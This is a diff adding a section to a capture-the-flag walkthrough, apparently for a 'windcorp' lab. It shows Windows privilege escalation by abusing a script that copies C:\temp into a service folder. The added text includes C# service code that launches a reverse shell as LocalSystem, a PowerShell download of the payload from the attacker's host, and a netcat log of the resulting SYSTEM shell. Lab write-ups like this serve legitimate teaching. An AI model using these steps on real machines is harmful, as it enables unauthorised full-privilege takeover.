@@ -1638,8 +1638,114 @@ The service is running as local system account that is perfect to escalate our p
     The IVPN Client service was started successfully.
 
 Now we have to find a way to put a malicious exe into <b>C:\Program Files\IVPN Client folder</b>
+My VPN IP and Osiris IP are changed from now on. Contiuning to analyze the server I found a C:\script folder containing 2 files:
+
+	copyprofile.cmd                                                      
+ 	update.vbs   
+
+Inspecting copyprofile we can see that the last command copies  all the contents in C:\temp to C:\Program Files\IVPN Client. That's perfect for our exploit to work, but of course we need to run the batch as a user having write permission to the destination folder. 
+
+	powershell -c "Invoke-WebRequest https://vpn.windcorp.thm/profile.zip -outfile c:\temp\profile.zip"
+	powershell Expand-Archive c:\temp\profile.zip -DestinationPath c:\temp\
+	powershell -c "copy-Item -Path 'C:\Temp\*' -Destination 'C:\Program Files\IVPN Client' -Recurse -force"
+ The vbs script indeed only write an entry to the event viewer registry:
+	
+ 	Set shell = CreateObject("WScript.Shell")
+	shell.LogEvent 4, "Update VPN profile"
+
+Indeed if you execute it as the current user the copyprofile is executed (as a different user of course) and the content of C:\temp is copied over C:\Program Files\IVPN Client. Let's verify. If we create a file:
+	
+	PS C:\script> echo "......" > C:\temp\log001.txt
+	echo "......" > C:\temp\log001.txt
+Execute the script:
+
+	PS C:\script> cscript update.vbs
+ We see that the file has been copied:
+ 
+	dir "C:\Program Files\IVPN Client" | findstr log001.txt
+ 	-a----          7/9/2024  12:41 AM             18 log001.txt                                                           
+
+Ok so we have all the requirements in order to perform our exploit. We only need to code a windows service that on start will execute a reverse shell. We can use malvasiaC reverse shell since it is already on the system. I created a simple C# windows service project using .Net 4.8 since as we saw it is installed on the server. You can find the source code [here (https://github.com/zinzloun/THM_WriteUP/blob/main/windcorp/WindowsService1.7z). The rilevant part is in Service1.cs:
+
+	
+        protected override void OnStart(string[] args)
+        {
+           
+
+            //here your payload
+            string payL = @"c:\windows\temp\rs.exe";
+            // eventually parameters
+            string paramS = string.Empty;
+
+            if (File.Exists(payL))
+            {
+                //sleep 10 seconds
+                System.Threading.Thread.Sleep(10000);
+                System.Diagnostics.Process.Start(payL, paramS);
+            }
+
+            else throw new System.Exception("The executable file has not been found");
+
+            
+        }
+
+The service on the start event will execute our reverse shell, before it will sleep 10 seconds, this to permit us, once restarted IVPN service, to cloes the current nc listener and to start it again, otherwise since the port would be occupied by the current session, the exploit wont work. Eventually you can configure the service name in ProjectInstaller.Designer.cs
+
+	...
+ 	 private void InitializeComponent()
+	 {
+	     this.serviceProcessInstaller1 = new System.ServiceProcess.ServiceProcessInstaller();
+	     this.serviceInstaller1 = new System.ServiceProcess.ServiceInstaller();
+	     // 
+	     // serviceProcessInstaller1
+	     // 
+	     this.serviceProcessInstaller1.Account = System.ServiceProcess.ServiceAccount.LocalSystem;
+	     this.serviceProcessInstaller1.Password = null;
+	     this.serviceProcessInstaller1.Username = null;
+	     // 
+	     // serviceInstaller1
+	     // 
+	     this.serviceInstaller1.ServiceName = "IVPN Service";
+	     this.serviceInstaller1.DisplayName = this.serviceInstaller1.ServiceName;
+	...
+
+I also specified that the service must run as local system user.
 
 
-PS C:\script> echo "......" > C:\temp\log001.txt
-echo "......" > C:\temp\log001.txt
+Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
+
+
+ 	PS C:\script> cscript update.vbs
+	cscript update.vbs
+	Microsoft (R) Windows Script Host Version 5.812
+	Copyright (C) Microsoft Corporation. All rights reserved.
+
+	
+ 	dir "C:\Program Files\IVPN Client"
+
+
+    Directory: C:\Program Files\IVPN Client
+
+
+	Mode                 LastWriteTime         Length Name                                                                 
+	----                 -------------         ------ ----                                                                 
+	...                                        
+	-a----          7/9/2024  12:14 AM           6656 IVPN.exe         
+ 	....
+
+  The IVPN Client service is starting....^C
+                                                                                                                                                                                                                                            
+
+└─$ nc -lvp 1234
+listening on [any] 1234 ...
+10.10.53.226: inverse host lookup failed: Unknown host
+connect to [10.9.0.223] from (UNKNOWN) [10.10.53.226] 50177
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
 
